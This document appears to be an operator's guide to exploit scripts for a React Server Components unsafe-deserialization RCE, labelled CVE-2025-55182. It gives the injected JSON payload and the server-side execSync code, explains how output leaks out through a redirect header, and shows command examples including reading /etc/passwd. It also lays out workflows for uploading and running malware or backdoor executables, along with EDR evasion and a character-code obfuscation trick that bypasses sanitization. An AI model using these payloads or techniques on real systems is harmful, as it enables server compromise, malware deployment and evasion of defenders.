# CVE-2025-55182 Exploitation Guide

Quick reference for `exploit.py` and `interactive_exploit.py`

## Tool Overview

**exploit.py** - Single-shot command execution, automation  
**interactive_exploit.py** - Interactive shell, manual exploration

---

## exploit.py Usage

```bash
python exploit.py -t http://target.com -c "whoami"
python exploit.py -t http://target.com -c "dir" -T 30
python exploit.py -t http://target.com -f payload.b64
```

**Arguments:** `-t` (target), `-c` (command), `-f` (upload file), `-T` (timeout)

---

## interactive_exploit.py Usage

```bash
python interactive_exploit.py -t http://target.com
python interactive_exploit.py -t http://target.com -T 30
```

### Built-in Commands

- `upload <file>` - Upload via echo (~8KB limit)
- `upload-node <file>` - Upload via Node.js (~30KB, EDR evasion)
- `decode <in> <out>` - Decode base64 via Node.js
- `download <file>` - Download file from target
- `info` - System information
- `timeout [sec]` - Show/set timeout
- `history` - Command history
- `clear`, `help`, `exit`

---

## File Upload Workflow

### Quick Upload (Echo)

```powershell
# Local
[Convert]::ToBase64String([IO.File]::ReadAllBytes("file.exe")) | Out-File file.b64

# Remote
rce #1 > upload file.b64
rce #2 > decode out.b64 file.exe
```

### Stealth Upload (Node.js - Recommended)

```powershell
# Local
[Convert]::ToBase64String([IO.File]::ReadAllBytes("malware.exe")) | Out-File malware.b64

# Remote
rce #1 > upload-node malware.b64
rce #2 > decode out.b64 malware.exe
rce #3 > malware.exe
```

**Why Node.js?** No suspicious commands, uses String.fromCharCode (no quotes), harder to detect.

---

## Examples

### Windows Target

```bash
python exploit.py -t http://target.com -c "whoami"
python exploit.py -t http://target.com -c "hostname"
python exploit.py -t http://target.com -c "powershell -c pwd"
```

### Linux Target

```bash
python exploit.py -t http://target.com -c "id"
python exploit.py -t http://target.com -c "uname -a"
python exploit.py -t http://target.com -c "cat /etc/passwd"
```

### Interactive Session

```bash
$ python interactive_exploit.py -t http://target.com

rce @ target.com #1 > info
rce @ target.com #2 > upload-node payload.b64
rce @ target.com #3 > decode out.b64 backdoor.exe
rce @ target.com #4 > backdoor.exe
rce @ target.com #5 > download config.json
rce @ target.com #6 > exit
```

---

## Technical Notes

### CVE-2025-55182 RCE Exploit

**Vulnerability:** React Server Components unsafe deserialization

**Attack Flow:**

```javascript
// 1. Inject fake Chunk object with custom 'then' handler
{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('COMMAND').toString();..."
  }
}

// 2. React deserializes and tries to resolve fake Chunk
// 3. Custom 'then' handler executes attacker's code
// 4. Use NEXT_REDIRECT to exfiltrate output via header
```

**Payload Structure:**

```
POST / HTTP/1.1
Next-Action: x
Content-Type: multipart/form-data

Field 0: Malicious JSON with injected code
Field 1: Reference to Field 0 ($@0)
Field 2: Empty array []
```

**Code Execution:**

```javascript
// Executed on server
process.mainModule.require("child_process").execSync("COMMAND");

// Output encoded in base64 and exfiltrated via redirect header
throw Object.assign(new Error("NEXT_REDIRECT"), {
  digest: `NEXT_REDIRECT;push;/login?a=${base64_output};307;`,
});
```

**Output Retrieval:**

```python
# Parse response header to get command output
redirect_header = response.headers.get('X-Action-Redirect')
# Extract: /login?a=BASE64_OUTPUT
decoded_output = base64.b64decode(url_decoded)
```

---

### String.fromCharCode Technique

The `upload-node` and `decode` commands use a special technique to bypass exploit payload sanitization.

**Problem:**

```python
# Traditional Node.js command fails because quotes get escaped
cmd = "node -e \"require('fs').writeFileSync('file', data)\""
#                     ^                         ^
# sanitize_command() escapes single quotes → breaks JSON payload
```

**Solution:**

```javascript
// Convert strings to numeric character codes
'fs' → String.fromCharCode(102,115)
'out.b64' → String.fromCharCode(111,117,116,46,98,54,52)

// Final command has ZERO quoted strings
echo BASE64 | node -e require(String.fromCharCode(102,115)).writeFileSync(String.fromCharCode(111,117,116,46,98,54,52),require(String.fromCharCode(102,115)).readFileSync(0))
```

**Benefits:**

- No quoted strings in entire command
- Bypasses `sanitize_command()` quote escaping
- Pure numeric codes - harder to pattern match
- Native Node.js - no suspicious processes
- Works through RCE payload without breaking JSON structure

**Implementation:**

```python
def to_charcode(s):
    return ','.join(str(ord(c)) for c in s)

fs_code = to_charcode('fs')  # → "102,115"
cmd = f"node -e require(String.fromCharCode({fs_code}))..."
```
